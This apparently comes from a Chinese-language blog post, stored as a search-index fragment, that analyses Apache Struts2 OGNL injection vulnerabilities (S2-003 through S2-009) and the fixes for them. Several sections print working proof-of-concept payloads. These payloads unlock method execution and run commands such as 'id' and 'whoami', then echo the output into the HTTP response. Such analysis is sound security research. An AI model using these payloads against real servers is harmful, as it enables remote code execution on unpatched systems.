\u6bd4\u5982   % { # writer = # context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter ( ) , # writer . println ( \" wh1t3p1g \" ) , # writer . flush ( ) , # writer . close ( ) }   \u5f53\u7136 \u4f60 \u4e5f \u53ef\u4ee5 \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u540e \u7684 \u5185\u5bb9   # pb = ( new   java . lang . ProcessBuilder ( \" whoami \" ) ) . start ( ) ,   # is = # pb . getInputStream ( ) ,   # isr = new   InputStreamReader ( # is ) ,   # br = new   BufferedReader ( # isr ) ,   # chars = new   char [ 500 ] ,   # br . read ( # chars ) ,   # str = new   java . lang . String ( # chars ) ,   / /   \u4e0a\u9762 \u4e3b\u8981 \u83b7\u53d6 \u6267\u884c \u540e \u7684 \u5185\u5bb9 \uff0c \u4e0b\u9762 \u4e3b\u8981 \u505a \u56de\u663e \u64cd\u4f5c   # writer = # context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter ( ) ,   # writer . println ( # str ) ,   # writer . flush ( ) ,   # writer . close ( )   % { # pb = ( new   java . lang . ProcessBuilder ( \" whoami \" ) ) . start ( ) , # is = # pb . getInputStream ( ) , # isr = new   java . io . InputStreamReader ( # is ) , # br = new   java . io . BufferedReader ( # isr ) , # chars = new   char [ 500 ] , # br . read ( # chars ) , # str = new   java . lang . String ( # chars ) , # writer = # context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter ( ) ,   # writer . println ( # str ) , # writer . flush ( ) , # writer . close ( ) }","title":"\u56de\u663e POC"},{"location":"blog/2020/talk_about_struts2/#_2","text":"\u5728 > = 2.0 . 9 \u7248\u672c \u7684 struts2 \u4e0a \uff0c   com . opensymphony . xwork2 . util . TextParseUtil # translateVariables   \u505a \u4e86 \u5faa\u73af \u5224\u65ad \uff0c \u4e0d \u5141\u8bb8 \u9012\u5f52 \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u9ed8\u8ba4   maxLoopCount   \u4e3a 1 \uff0c \u6240\u4ee5 \u5904\u7406 \u5b8c   % { name }   \u540e \uff0c \u4e0d\u4f1a \u518d \u7ee7\u7eed \u5bf9 \u4ed6 \u7684 \u503c \u8fdb\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c \u4e86 \u3002","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#2-s2-003","text":"\u5f71\u54cd \u8303\u56f4 \uff1a 2.0 . 0   -   2.0 . 11.2   \u770b\u5b98 \u7f51 \u7684 \u4ecb\u7ecd \uff0c \u95ee\u9898 \u51fa \u5728   ParametersInterceptor   \uff0c \u524d\u9762 \u5229\u7528 \u4e86   Ognl . getValue   \u6765 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u800c S2 - 003 \u7528 \u7684 \u5219 \u662f   Ognl . setValue   \uff0c \u8be5 \u51fd\u6570 \u4e5f \u540c\u6837 \u53ef\u4ee5 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   source :   \u53c2\u6570 \u7684 key \uff0c \u4f7f\u7528 unicode \u7f16\u7801 \u7ed5\u8fc7   #   \u7684 \u68c0\u6d4b   sink :   \u8c03\u7528   Ognl . setValue","title":"2 .   S2 - 003"},{"location":"blog/2020/talk_about_struts2/#_3","text":"Struts2 \u5728 \u5904\u7406 \u53c2\u6570 \u5185\u5bb9 \u65f6 \uff0c \u5c06 \u8c03\u7528   com . opensymphony . xwork2 . interceptor . ParametersInterceptor # setParameters   \u51fd\u6570 \uff0c \u586b\u5145 \u5230 OgnlVauleStack \u7684 context \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 \u91cc \u3002   \u8fd9\u91cc \u4f1a \u5148\u8fc7 \u4e00\u6b21   acceptableName   \u7684 \u68c0\u67e5 \uff08 2.0 . 8 \u7248\u672c \uff09   \u4e0d\u80fd \u51fa\u73b0   =   \u3001   ,   \u3001   #   \u3001   :   \u4ee5\u53ca \u88ab \u6392\u9664 \u5728\u5916 \u7684 \u53c2\u6570 \u540d   \u53ea\u6709 \u901a\u8fc7 \u4e86 acceptableName \u51fd\u6570 \u7684 \u68c0\u67e5 \u624d\u80fd \u7ee7\u7eed \u5f80\u4e0b \u4e0b\u8d70 \u5f80\u4e0b\u8d70 \uff0c \u6240\u4ee5 \u6211\u4eec \u5fc5\u987b \u7ed5\u8fc7 \u4e0a\u9762 \u7684 \u51e0\u4e2a \u95ee\u9898 \uff0c \u8fd9\u91cc \u6f0f\u6d1e \u53d1\u73b0 \u53d1\u73b0\u8005 \u7528 \u4e86 unicode \u7f16\u7801 \u6765 \u7ed5\u8fc7 \u68c0\u6d4b \u3002   ognl . JavaCharStream # readChar   \u5f53 \u9047\u5230   \\ u   unicode \u7f16\u7801 \uff0c \u4f1a \u505a \u4e00\u6b21 \u8f6c\u6362 \uff0c \u6bd4\u5982   \\ u0040   \u4f1a \u88ab \u8f6c\u6210   @   \u800c   acceptableName   \u51fd\u6570 \u5e76 \u6ca1\u6709 \u8003\u8651 unicode \u7f16\u7801 \u7684 \u65b9\u5f0f \uff0c \u5bfc\u81f4 \u5176 \u5f62\u540c \u865a\u8bbe \u5f62\u540c\u865a\u8bbe \u3002   \u56de\u5230   setParameters   \uff0c \u540e\u7eed \u8c03\u7528 \u4e86   OgnlValueStack . setValue   \u8fd9\u91cc \u6700\u7ec8 \u5230 \u4e86   OgnlUtil . setValue   \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f","title":"\u6f0f\u6d1e \u5206\u6790"},{"location":"blog/2020/talk_about_struts2/#poc_1","text":"\u6765\u770b \u4e00\u4e2a \u8c03\u7528 \u547d\u4ee4 \u6267\u884c \u7684 POC   (   ' \\   u0023context   [   \\ '   xwork   .   MethodAccessor   .   denyMethodExecution   \\ '   ]   \\   u003dfalse   '   ) (   bla   ) (   bla   )   &   (   ' \\   u0040java   .   lang   .   Runtime   @ getRuntime   ( ) .   exec   (   \\ '   open   /   System   /   Applications   /   Calculator   .   app   \\   ' ) '   ) (   bla   ) (   bla   )   \u5148 \u6765\u770b \u7b2c\u4e00 \u4e00\u53e5 \u7b2c\u4e00\u53e5 \uff0c \u8be5\u6761 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7528\u4e8e \u5f00\u542f \u65b9\u6cd5 \u6267\u884c \uff0c \u56e0\u4e3a \u5728 \u8c03\u7528   setParameters   \u4e4b\u524d \uff0c \u5f00\u53d1 \u53d1\u4eba \u4eba\u5458 \u5f00\u53d1\u4eba\u5458 \u8003\u8651 \u5230 \u4e86 \u53c2\u6570 \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u98ce\u9669 \uff0c \u6240\u4ee5 \u63d0\u524d \u5173\u95ed \u4e86 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u6267\u884c   \u8bbe\u7f6e \u5b8c \u4e86 \u4e4b\u540e \uff0c \u518d \u8fd8\u539f \u56de\u6765   \u4f46\u662f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u5bf9\u4e8e \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 \u7684 \u5185\u5bb9 \u662f \u53ef\u63a7 \u7684 \uff0c \u6211\u4eec \u53ef\u4ee5 \u5728 \u8fdb\u884c \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u524d \uff0c \u5c06 context \u91cc \u7684   xwork . MethodAccessor . denyMethodExecution   \u8bbe \u4e3a   false   \uff0c   \u8fd9\u6837 \u7b2c\u4e8c \u4e8c\u53e5 \u7b2c\u4e8c\u53e5 poc \u5c31 \u53ef\u4ee5 \u6267\u884c \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u4e86 \u3002   \u6240\u4ee5 \u5728 \u53d1\u9001 \u8fd9 \u4e24\u6761 POC \u65f6 \uff0c \u9700\u8981 \u63a7\u5236 \u597d \u8bbe\u7f6e false \u5728 \u524d \uff0c \u6267\u884c \u5728 \u540e \uff08 ascii \u6392\u5e8f \uff0c \u53ef\u4ee5 \u770b \u56de\u663e poc \u7684 \u5904\u7406 \uff09   \u8ddf \u524d\u9762 \u4e00\u6837 \uff0c \u5199 \u4e00\u4e0b \u56de\u663e \u7684 POC   (   a   ) ( (   ' \\   u0023context   [   \\ '   xwork   .   MethodAccessor   .   denyMethodExecution   \\ '   ]   \\   u003dfalse   '   ) (   bla   ) )   (   b   ) ( (   ' \\   u0023ret   \\   u003d   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   \\ '   id   \\   ' ) '   ) (   bla   ) )   &   / /   \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4   (   c   ) ( (   ' \\   u0023dis   \\   u003dnew   \\   u0020java   .   io   .   DataInputStream   (   \\   u0023ret   .   getInputStream   ( ) )   '   ) (   bla   ) )   &   (   d   ) ( (   ' \\   u0023res   \\   u003dnew   \\   u0020byte   [   2000   ]   '   ) (   bla   ) )   &   (   e   ) ( (   ' \\   u0023dis   .   readFully   (   \\   u0023res   )   '   ) (   bla   ) )   &   (   f   ) ( (   ' \\   u0023writer   \\   u003d   \\   u0023context   .   get   (   \\ '   com   .   opensymphony   .   xwork2   .   dispatcher   .   HttpServletResponse   \\ '   ) .   getWriter   ( )   '   ) (   bla   ) )   &   (   g   ) ( (   ' \\   u0023writer   .   println   (   new   \\   u0020java   .   lang   .   String   (   \\   u0023res   ) )   '   ) (   bla   ) )   &   / /   \u83b7\u53d6 response \uff0c \u56de\u663e \u6570\u636e   (   h   ) ( (   ' \\   u0023writer   .   flush   ( )   '   ) (   bla   ) )   &   (   i   ) ( (   ' \\   u0023writer   .   close   ( )   '   ) (   bla   ) )   \u8fd9\u91cc poc \u7684 \u5148\u540e \u987a\u5e8f \u5148\u540e\u987a\u5e8f \u7528\u5230 \u4e86 \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u4f4d\u7f6e \uff0c \u5b9e\u9645 \u7684 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u653e\u5230 \u4e86 \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u4f4d\u7f6e   ( 1 ) ( ( 2 ) ( 3 ) )","title":"POC \u5206\u6790"},{"location":"blog/2020/talk_about_struts2/#_4","text":"xwork > = 2.0 . 6   com . opensymphony . xwork2 . interceptor . ParametersInterceptor # setParameters   \u591a \u4e86 \u4ee5\u4e0b \u4ee3\u7801   \u4f4e\u7248 \u7248\u672c \u4f4e\u7248\u672c \u7528 \u7684 \u76f4\u63a5 \u662f \u5df2 \u5b58\u5728 \u7684 OgnlValueStack \uff0c \u4ece 2.0 . 6 \u5f00\u59cb \uff0c \u4f7f\u7528 \u4e86 \u4e00\u4e2a \u7a7a \u7684 stack \u6765 \u5904\u7406 \u53c2\u6570 \u7684 \u89e3\u6790   \u5e76\u4e14 \u4ece \u8fd9\u4e2a \u7248\u672c \u5f00\u59cb \u591a \u4e86 SecurityMemberAccess \uff0c \u7528\u6765 \u9650\u5236 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u4e2d \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528   \u5728   ognl . OgnlRuntime # callAppropriateMethod   \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u524d \uff0c \u4f1a \u53bb \u5224\u65ad \u51fd\u6570 \u662f\u5426 \u53ef \u88ab \u8bbf\u95ee ( method \u4e0d\u4e3a null )   \u5176\u5b9e \u8fd9\u8fb9   isMethodAccessible   \u7684 \u8fd4\u56de \u7ed3\u679c \u65e0\u6240 \u6240\u8c13 \u65e0\u6240\u8c13 \uff0c \u4f46\u662f \u4e0d\u80fd \u5728 \u8fd9\u4e2a \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u65f6 \u51fa\u9519 \uff0c \u51fa\u9519 \u7684\u8bdd \u4e5f \u5c31 \u8d70 \u4e0d\u5230   invokeMethod   \u770b \u4e00\u4e0b \u5177\u4f53 \u7684 \u5b9e\u73b0 \uff0c   isMethodAccessible   \u7684 \u5224\u65ad \u4f9d\u8d56 \u8d56\u4e8e \u4f9d\u8d56\u4e8e   SecurityMemberAccess   \u8fd9\u91cc \u6211\u4eec \u4e3b\u8981 \u770b   isAcceptableProperty   \u4e0b \u7aef\u70b9 \u8c03\u8bd5 \u4f60 \u4f1a \u53d1\u73b0 \u8fd9\u4e2a \u7248\u672c acceptProperties \u4e3a\u7a7a \uff0c \u800c excludeProperties \u975e\u7a7a \uff0c \u6240\u4ee5 \u5728 \u8c03\u7528   isExclude   \u51fd\u6570 \u65f6 \uff0c \u6b63\u5219 \u8c03\u7528   pattern . matcher ( null )   \u4f1a \u62a5\u9519 \uff0c \u4e5f \u5c31 \u65e0\u6cd5 \u8fbe\u5230 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u7684 \u76ee\u7684 \u4e86 \uff08   propertiesName   \u4e3a null \uff09 \u3002   \u6240\u4ee5 \u5982\u679c \u8981 \u7ed5\u8fc7 \u8fd9\u4e2a \u7248\u672c \u7684 \u9650\u5236 \uff0c \u9996\u5148 \u9700\u8981 \u89e3\u51b3 \u7684 \u662f \u8fd9\u4e2a \u51fd\u6570 \u7684 \u62a5\u9519 \u95ee\u9898 \uff0c \u770b S2 - 005","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#3-s2-005","text":"\u5f71\u54cd \u7248\u672c \uff1a struts2.0 . 0   -   2.1 . 8.1   S2 - 005 \u4e3a S2 - 003 \u7684 \u4fee\u590d \u7ed5\u8fc7 \uff0c \u76f4\u63a5 \u5206\u6790 POC","title":"3 .   S2 - 005"},{"location":"blog/2020/talk_about_struts2/#poc_2","text":"(   ' \\   u0023 _ memberAccess   .   excludeProperties   \\   u003d   @ java . util . Collections @ EMPTY _ SET   '   ) (   bla   ) (   bla   )   &   (   ' \\   u0023context   [   \\ '   xwork   .   MethodAccessor   .   denyMethodExecution   \\ '   ]   \\   u003dfalse   '   ) (   bla   ) (   bla   )   &   (   ' \\   u0040java   .   lang   .   Runtime   @ getRuntime   ( ) .   exec   (   \\ '   open   \\   u0020   /   System   /   Applications   /   Calculator   .   app   \\   ' ) '   ) (   bla   ) (   bla   )   \u524d\u9762 S2 - 003 \u4fee\u590d \u90e8\u5206 \u8bf4 \u5230 \u4e86 \u9700\u8981 \u7ed5\u8fc7   isAcceptableProperty   \u51fd\u6570 \u62a5\u9519 \u7684 \u95ee\u9898 \u624d\u80fd \u7ee7\u7eed \u5f80 \u4e0b \u8fdb\u884c \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u3002   \u4ece \u4ee3\u7801 \u4e0a \u770b \uff0c \u53ea\u8981   excludeProperties   \u548c   acceptProperties   \u4e3a\u7a7a \uff0c \u5c31 \u4e0d\u4f1a \u8fdb \u5230 \u6b63\u5219 \u5339\u914d \u7684 \u73af\u8282 \uff0c \u6240\u4ee5 \u9700\u8981 \u5c06 \u4ed6\u4eec \u7f6e \u4e3a \u7a7a   poc \u91cc \u7684 \u7b2c\u4e00 \u4e00\u884c \u7b2c\u4e00\u884c \u505a \u7684 \u5c31\u662f \u8fd9\u4e2a \u4e8b\u60c5 \uff0c \u5c06   excludeProperties   \u7f6e \u4e3a \u7a7a\u96c6 \u96c6\u5408 \u7a7a\u96c6\u5408   \u8fd9\u91cc \u770b \u4e00\u4e0b \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u4ee5   #_ memberAccess   \u7684 \u65b9\u5f0f \u53ef\u4ee5 \u8bbf\u95ee \u5230   OgnlContext   \u5bf9\u8c61 \u7684   memberAccess   \u5c5e\u6027   ognl . OgnlContext # get   \u4ece   OgnlContext   \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 \u83b7\u53d6 \u5185\u5bb9 \uff0c \u9996\u5148 \u4f1a \u5224\u65ad \u662f\u5426 \u5728   RESERVED _ KEYS   \u96c6\u5408 \u91cc \uff0c \u5982\u679c \u5b58\u5728 \uff0c \u5219 \u76f8\u5e94 \u7684 \u8c03\u7528 \u4ed6 \u7684 getters \uff0c \u5982\u679c \u4e0d \u5b58\u5728 \uff0c \u5219 \u4ece \u5f53\u524d \u7684 \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 \u91cc \u53bb \u627e \u8fd9\u4e2a key \u3002   \u6240\u4ee5   #_ memeberAccess   \u5b9e\u9645 \u83b7\u53d6 \u7684 \u662f   OgnlContext   \u7684   memeberAccess   \u5c5e\u6027 \u5185\u5bb9   \u8fd8\u6709 \u51fa\u73b0 \u53d8\u5316 \u7684 \u5730\u65b9 \uff0c \u7531\u4e8e \u73b0\u5728 context \u91cc \u662f \u6ca1\u6709 response \u5bf9\u8c61 \u53ef\u4ee5 \u83b7\u53d6 \u7684 \uff0c \u6240\u4ee5 \u5728 \u5904\u7406 \u56de\u663e \u7684 \u65f6\u5019 \u6211\u4eec \u9700\u8981 \u627e \u53e6\u5916 \u7684 \u65b9\u6cd5   (   a   ) ( (   ' \\   u0023 _ memberAccess   .   excludeProperties   \\   u003d   @ java . util . Collections @ EMPTY _ SET   '   ) (   bla   ) )   &   (   a   ) ( (   ' \\   u0023context   [   \\ '   xwork   .   MethodAccessor   .   denyMethodExecution   \\ '   ]   \\   u003dfalse   '   ) (   bla   ) )   &   (   b   ) ( (   ' \\   u0023ret   \\   u003d   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   \\ '   id   \\   ' ) '   ) (   bla   ) )   &   / /   \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4   (   c   ) ( (   ' \\   u0023dis   \\   u003dnew   \\   u0020java   .   io   .   DataInputStream   (   \\   u0023ret   .   getInputStream   ( ) )   '   ) (   bla   ) )   &   (   d   ) ( (   ' \\   u0023res   \\   u003dnew   \\   u0020byte   [   2000   ]   '   ) (   bla   ) )   &   (   e   ) ( (   ' \\   u0023dis   .   readFully   (   \\   u0023res   )   '   ) (   bla   ) )   &   (   f   ) ( (   ' \\   u0023writer   \\   u003d   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getWriter   ( )   '   ) (   bla   ) )   &   (   g   ) ( (   ' \\   u0023writer   .   println   (   new   \\   u0020java   .   lang   .   String   (   \\   u0023res   ) )   '   ) (   bla   ) )   &   / /   \u83b7\u53d6 response \uff0c \u56de\u663e \u6570\u636e   (   h   ) ( (   ' \\   u0023writer   .   flush   ( )   '   ) (   bla   ) )   &   (   i   ) ( (   ' \\   u0023writer   .   close   ( )   '   ) (   bla   ) )   \u8fd9\u91cc \u4f7f\u7528 \u4e86   @ org . apache . struts2 . ServletActionContext @ getResponse ( )   \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u6765 \u83b7\u53d6 response","title":"POC \u5206\u6790"},{"location":"blog/2020/talk_about_struts2/#_5","text":"xwork > = 2.2 . 1.1 \uff0c \u5bf9 \u53c2\u6570 \u540d \u505a \u4e86 \u66f4\u4e3a \u7ec6\u81f4 \u7684 \u6b63\u5219 \u68c0\u67e5   [ a - zA - Z0 - 9 \\ \\ . \\ \\ ] \\ \\ [ \\ \\ ( \\ \\ ) _ ' \\ \\ s ] +","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#4-s2-007","text":"\u8fd9\u91cc \u8ddf S2 - 008 \u91cc\u9762 \u7684 \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u6f0f\u6d1e \u4e00\u6837   com . opensymphony . xwork2 . interceptor . ConversionErrorInterceptor # intercept   value \u4e3a \u6211\u4eec \u4f20\u5165 \u7684 \u6570\u636e \uff0c \u8fc7 \u4e86 \u4e00\u6b21 getOverrideExpr   \u5bf9 \u6211\u4eec \u7684 \u8f93\u5165 \u56f4\u4e0a \u4e86 \u5f15\u53f7 \u5355\u5f15\u53f7 \uff0c \u8fd9\u91cc \u5982\u679c \u6211\u4eec \u7684 payload \u4e3a   ' + xxxx + '   \uff0c \u8fd9\u91cc \u7684 xxxx \u5c31 \u9003\u9038 \u51fa\u6765 \u4e86 \uff0c \u800c \u4e0d\u5355 \u5355\u5355 \u5355\u5355\u662f \u4e0d\u5355\u5355\u662f \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4e86   \u540e\u7eed \u5c06 \u5904\u7406 \u597d \u7684 \u6570\u636e \u653e\u5230 \u4e86 stack \u7684 overrides \u91cc\u9762   \u800c \u5b9e\u9645 \u89e6\u53d1 \u7684 \u5730\u65b9 \u8ddf S2 - 001 \u4e00\u6837 \uff0c \u662f \u5728 \u89e3\u6790 JSP \u7684 \u65f6\u5019 \u9020\u6210 \u7684   \u5728   tryFIndValue   \u51fd\u6570 \u4e2d \uff0c \u4ece stack \u7684 overrides \u4e2d \u53d6\u51fa \u524d\u9762 \u52a0 \u4e86 \u5f15\u53f7 \u5355\u5f15\u53f7 \u7684 \u6570\u636e \uff0c \u5e76 \u5728 \u540e\u7eed \u8c03\u7528   Ognl . getValue   \uff0c \u5bfc\u81f4 \u4e86 Ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c \u3002","title":"4 .   S2 - 007"},{"location":"blog/2020/talk_about_struts2/#poc_3","text":"'   +   (   #   _ memberAccess   .   allowStaticMethodAccess   =   true   ,   #   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   /   System   /   Applications   /   Calculator   .   app   '   ) )   +   '   xwork > = 2.2 . 3 \uff0c ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u8ba1\u7b97 \u65f6 \uff0c \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u7684 \u51fd\u6570 \u5224\u65ad   isAcceptableProperty   \u5982\u679c name \u4e3a null \u76f4\u63a5 \u8fd4\u56de true \uff0c \u6240\u4ee5 \u6211\u4eec \u4e0d\u7528 \u50cf s2 - 005 \u90a3\u6837 \u628a   excludeProperties   \u7f6e \u4e3a \u7a7a\u96c6 \u96c6\u5408 \u7a7a\u96c6\u5408 \u3002   \u4f46\u662f \u4ece \u8fd9\u91cc \u5f00\u59cb \uff0c   allowStaticMethodAccess   \u9ed8\u8ba4 \u4e3a false \uff0c \u6211\u4eec \u9700\u8981 \u5c06 \u5176\u7f6e \u4e3a true \uff0c \u624d\u80fd \u6b63\u5e38 \u6267\u884c \u9759\u6001 \u51fd\u6570 \u3002   \u6240\u4ee5 POC \u7b2c\u4e00 \u4e8c\u53e5 \u90fd \u662f \u5728 \u89e3\u9664 \u9650\u5236 \u89e3\u9664\u9650\u5236 \uff0c \u7b2c\u4e09 \u4e09\u53e5 \u7b2c\u4e09\u53e5 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4   \u5199 \u4e00\u4e0b \u56de\u663e \u7684 POC   '   +   (   #   _ memberAccess   .   allowStaticMethodAccess   =   true   ,   #   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   #   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ,   #   isr   =   new   java   .   io   .   InputStreamReader   (   #   ret   .   getInputStream   ( ) ) ,   #   br   =   new   java   .   io   .   BufferedReader   (   #   isr   ) ,   #   res   =   new   char   [   2000   ]   ,   #   br   .   read   (   #   res   ) ,   #   writer   =   #   context   [   '   com   .   opensymphony   .   xwork2   .   dispatcher   .   HttpServletResponse   '   ]   .   getWriter   ( ) ,   #   writer   .   println   (   new   java   .   lang   .   String   (   #   res   ) ) ,   #   writer   .   flush   ( ) ,   #   writer   .   close   ( )   )   +   '","title":"POC"},{"location":"blog/2020/talk_about_struts2/#5-s2-008","text":"S2 - 008 \u4e00\u5171 \u6709 4 \u4e2a \u6f0f\u6d1e \uff0c \u8be6\u7ec6 \u770b https : / / cwiki . apache . org / confluence / display / WW / S2 - 008   \u5176\u4e2d 1 \u8ddf S2 - 007 \u7c7b\u4f3c \uff0c 3 \u4e0d\u770b \u4e86 \uff0c \u4e3b\u8981 \u5173\u6ce8 2 \u548c 4","title":"5 .   S2 - 008"},{"location":"blog/2020/talk_about_struts2/#cookieinterceptor","text":"\u8fd9\u91cc \u7684 \u539f\u7406 \u540c S2 - 005 \u7c7b\u4f3c \uff0c \u8fd9\u91cc \u770b \u4ee3\u7801 \u6bd4\u8f83 \u76f4\u89c2 \uff0c \u6ca1\u6709 \u642d \u73af\u5883 \u8c03 \u4e86   org . apache . struts2 . interceptor . CookieInterceptor # intercept   \u8fd9\u91cc \u4f1a\u5230   OgnlValueStack . setValue   \uff0c \u4e5f \u5c31\u662f \u540e\u7eed \u8c03\u7528   Ognl . setValue   \uff0c \u7528   ( ( 1 ) ( 2 ) ) ( 3 )   \u7684 \u65b9\u5f0f \u6765 \u6267\u884c \u4efb\u610f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f","title":"CookieInterceptor"},{"location":"blog/2020/talk_about_struts2/#debugginginterceptor","text":"\u5f53 \u5f00\u542f \u5f00\u53d1 \u5f00\u53d1\u8005 \u6a21\u5f0f \u65f6 \uff0c \u4f20\u5165   debug = command & expression = xxxx   \uff0c \u5373\u53ef \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f","title":"DebuggingInterceptor"},{"location":"blog/2020/talk_about_struts2/#poc_4","text":"?   debug   =   command   &   expression   =   (   %   23 _   memberAccess   .   allowStaticMethodAccess   =   true   ,   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   /   System   /   Applications   /   Calculator   .   app   '   ) )   / /   \u56de\u663e POC   (   %   23 _   memberAccess   .   allowStaticMethodAccess   =   true   ,   %   23   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ,   %   23   isr   =   new   java   .   io   .   InputStreamReader   (   %   23   ret   .   getInputStream   ( ) ) ,   %   23   br   =   new   java   .   io   .   BufferedReader   (   %   23   isr   ) ,   %   23   res   =   new   char   [   2000   ]   ,   %   23   br   .   read   (   %   23   res   ) ,   new   java   .   lang   .   String   (   %   23   res   ) )","title":"POC"},{"location":"blog/2020/talk_about_struts2/#6-s2-009","text":"\u5f71\u54cd \u8303\u56f4 \uff1a 2.0 . 0   -   2.3 . 1.1   \u9488\u5bf9 S2 - 005 \u7684 \u4fee\u590d \uff0c \u5bf9 \u53c2\u6570 \u505a   [ a - zA - Z0 - 9 \\ \\ . \\ \\ ] \\ \\ [ \\ \\ ( \\ \\ ) _ ' \\ \\ s ] +   \u6b63\u5219 \u68c0\u67e5 \uff0c \u8fd9\u91cc \u89c4\u907f \u4e86 \u53c2\u6570 \u540d\u4e2d \u51fa\u73b0   #   \u3001 unicode \u7f16\u7801 \u7b49   S2 - 009 \u662f \u5bf9 S2 - 005 \u7684 \u7ed5\u8fc7 \uff0c \u8fd9\u91cc \u7528 \u7684 \u5c31\u662f   Ognl . setValue   \u51fd\u6570 \u7684 \u53e6 \u4e00\u79cd \u7528\u6cd5   a [ ( 1 ) ( 2 ) ]   \uff0c \u8fd8\u6709 \u4e00\u4e2a \u6bd4\u8f83 \u5de7\u5999 \u7684 \u662f \uff0c \u524d\u9762 \u7684 \u51e0\u4e2a \u6f0f\u6d1e \u5229\u7528 \uff0c \u6211\u4eec \u90fd \u662f \u76f4\u63a5 \u5728   ( 1 )   \u5199 \u4e0a \u8981 \u6267\u884c \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u800c S2 - 009 \u5219 \u901a\u8fc7 context \u91cc \u7684 \u5185\u5bb9 \u6765 \u8fdb\u884c \u4e00\u4e2a \u4e2d\u8f6c \uff0c \u5c06 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u653e\u5230   key = value   \u7684 value \u7684 \u4f4d\u7f6e \uff0c \u518d \u7531   a [ ( key ) ( 2 ) ]   \u7684 \u65b9\u5f0f \u53bb \u6267\u884c value \u7684 \u5185\u5bb9 \u3002   OgnlContext   context   =   new   OgnlContext   ( ) ;   context   .   put   (   \" test \"   ,   \" @ java . lang . Runtime @ getRuntime ( ) . exec ( \\ ' open   / System / Applications / Calculator . app / \\ ' ) \"   ) ;   / /   \u5047\u8bbe context \u5b58\u5728 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f test   Ognl   .   setValue   (   \" a [ ( test ) ( bla ) ] \"   ,   context   ,   \" \"   ) ;   / /   \u4ee5 a [ ( test ) ( bla ) ] , \u6267\u884c test \u6240 \u4ee3\u8868 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u4e0a\u9762 \u4ee3\u7801 \u4e2d \u7684 \u5047\u8bbe \uff0c \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 \u4f20\u5165   ? param = xxx   \u7684 \u65b9\u5f0f 